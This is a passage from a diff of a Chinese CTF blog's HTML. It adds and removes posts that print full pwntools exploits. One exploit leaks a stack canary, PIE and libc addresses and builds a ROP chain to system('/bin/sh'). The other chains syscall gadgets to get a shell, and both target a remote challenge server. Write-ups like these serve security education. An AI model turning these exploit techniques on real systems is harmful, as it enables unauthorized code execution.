class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">33406</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#————————泄露canary————————</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">88</span> + <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">c = sh.recv(<span class="number">7</span>)</span><br><span class="line">c = <span class="string">b&#x27;\x00&#x27;</span> + c</span><br><span class="line">canary = u64(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary=&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#——————————泄露基址——————————</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;game!\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">71</span> + <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">m = sh.recv(<span class="number">6</span>)</span><br><span class="line">m = m + <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">main = u64(m)</span><br><span class="line">main_addr = main - <span class="number">0x101347</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main=&#x27;</span>,<span class="built_in">hex</span>(main_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Do it agian?\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span> + p64(canary) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(main_addr+<span class="number">0x1010e4</span>)</span><br><span class="line">sh.send(payload)<span class="comment">#回到起始位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#————————泄露got表puts地址————————</span></span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = main_addr + <span class="number">0x101227</span></span><br><span class="line">ret = main_addr + <span class="number">0x101228</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(main_addr+put_got+<span class="number">0x100000</span>)</span><br><span class="line">payload += p64(main_addr+put_plt+<span class="number">0x100000</span>)</span><br><span class="line">payload += p64(main_addr+<span class="number">0x1010e4</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;game!\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;ok&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Do it agian?\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;ok&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = sh.recv(<span class="number">6</span>)</span><br><span class="line">p = p + <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">puts_addr = u64(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#————————计算libc基址————————</span></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh addr=&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))  </span><br><span class="line"></span><br><span class="line"><span class="comment">#——————————get shell——————————</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(main_addr+<span class="number">0x1010e4</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;game!\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;ok&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Do it agian?\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/07/2025-12-07-%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -618,109 +968,6 @@
 <p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/stack.png"></p>
 <p>exp如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./attachment&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc-2.27.so&#x27;, &#x27;LD_LIBRARY_PATH&#x27;: &#x27;.&#x27;&#125;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34792</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_info</span>(<span class="params">name, addr</span>):</span><br><span class="line">    output_log = <span class="string">&#x27;&#123;&#125; =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(addr))</span><br><span class="line">    all_logs.append(output_log)</span><br><span class="line">    success(output_log)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">weapon</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;..!?\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bless</span>(<span class="params">count, addr</span>):</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(count).encode())</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(addr).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">content1, content2</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sh.send(content1)</span><br><span class="line">    </span><br><span class="line">    sh.send(content2)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x04007fe</span></span><br><span class="line">pop_rdi = <span class="number">0x4013f4</span></span><br><span class="line">pop_rsi = <span class="number">0x4013f6</span></span><br><span class="line">pop_rdx = <span class="number">0x4013f8</span></span><br><span class="line">pop_rsp = <span class="number">0x4013fa</span></span><br><span class="line">bin_sh = <span class="number">0x4019D7</span></span><br><span class="line">syscall = <span class="number">0x602058</span></span><br><span class="line"></span><br><span class="line">weapon(<span class="number">0x25a8</span>)</span><br><span class="line">bless(<span class="number">5</span>, syscall)</span><br><span class="line"></span><br><span class="line">payload1 = p64(ret)*<span class="number">22</span></span><br><span class="line">rop_chain = p64(pop_rdi) + p64(bin_sh)</span><br><span class="line">rop_chain += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(pop_rsp) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload1 = payload1 + rop_chain</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">59</span></span><br><span class="line">challenge(payload1, payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.send(&#x27;exec 1&gt;&amp; 0&#x27;)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/07/2025-12-08-Signin/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Whoamiuu's Blogs">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Whoamiuu's Blogs">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/12/07/2025-12-08-Signin/" class="post-title-link" itemprop="url">CTF题解：Signin</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2025-12-07 20:00:00" itemprop="dateCreated datePublished" datetime="2025-12-07T20:00:00+08:00">2025-12-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-12-08 22:41:28" itemprop="dateModified" datetime="2025-12-08T22:41:28+08:00">2025-12-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h1><h2 id="一、思路"><a href="#一、思路" class="headerlink" title="一、思路"></a>一、思路</h2><p><img src="/images/signin/checksec.png" alt="image-20251201160105455"></p>
-<p><img src="/images/signin/vuln.png" alt="image-20251201192652962"></p>
-<p>checksec发现程序有pie和canary，并且有三处read可以溢出，至少需要两次泄露</p>
-<h2 id="二、步骤"><a href="#二、步骤" class="headerlink" title="二、步骤"></a>二、步骤</h2><h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>先泄露canary，canary一般在rbp前，用pwndbg调试，输入100个字符</p>
-<p><img src="/images/signin/step1.png" alt="image-20251201193149423"></p>
-<p>发现canary在偏移88处。因为canary最低位是\x00，并且printf会一直打印直到遇到空字符，所以我们可以输入89字节覆盖掉canary的\x00，printf就会将canary打印出来。</p>
-<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>再泄露main基址，同上可知缓冲区56，再加上canary和rbp的16字节，共72字节，发送payload &#x3D; b’a’*72可以发现泄露了main+28的地址，由此可得main地址</p>
-<p><img src="/images/signin/step2.png" alt="image-20251201200253592"></p>
-<p><img src="C:\Users\WH\AppData\Roaming\Typora\typora-user-images\image-20251201200328810.png" alt="image-20251201200328810"></p>
-<h4 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h4><p>从反汇编中找到xor ebp,ebp偏移为0x1010e4，main偏移为</p>
-<p>0x10132b，利用第三次溢出覆盖返回地址为_start，重新运行</p>
-<p><img src="/images/signin/step3.png" alt="image-20251201201608418"></p>
-<p><img src="/images/signin/step33.png" alt="image-20251201201636606"></p>
-<h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><p>泄露libc基址。程序有调用puts，并且有pop rdi, ret，可以利用puts输出libc基址</p>
-<p><img src="/images/signin/step4.png" alt="image-20251201211613397"></p>
-<p>这里只是偏移，需要加上之前的基址。</p>
-<p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">33406</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#————————泄露canary————————</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">88</span> + <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">c = sh.recv(<span class="number">7</span>)</span><br><span class="line">c = <span class="string">b&#x27;\x00&#x27;</span> + c</span><br><span class="line">canary = u64(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary=&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#——————————泄露基址——————————</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;game!\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">71</span> + <span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">m = sh.recv(<span class="number">6</span>)</span><br><span class="line">m = m + <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">main = u64(m)</span><br><span class="line">main_addr = main - <span class="number">0x101347</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main=&#x27;</span>,<span class="built_in">hex</span>(main_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Do it agian?\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span> + p64(canary) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(main_addr+<span class="number">0x1010e4</span>)</span><br><span class="line">sh.send(payload)<span class="comment">#回到起始位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#————————泄露got表puts地址————————</span></span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = main_addr + <span class="number">0x101227</span></span><br><span class="line">ret = main_addr + <span class="number">0x101228</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(main_addr+put_got+<span class="number">0x100000</span>)</span><br><span class="line">payload += p64(main_addr+put_plt+<span class="number">0x100000</span>)</span><br><span class="line">payload += p64(main_addr+<span class="number">0x1010e4</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;game!\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;ok&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Do it agian?\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;ok&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = sh.recv(<span class="number">6</span>)</span><br><span class="line">p = p + <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">puts_addr = u64(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#————————计算libc基址————————</span></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh addr=&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))  </span><br><span class="line"></span><br><span class="line"><span class="comment">#——————————get shell——————————</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(main_addr+<span class="number">0x1010e4</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;game!\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;ok&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Do it agian?\n&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
       
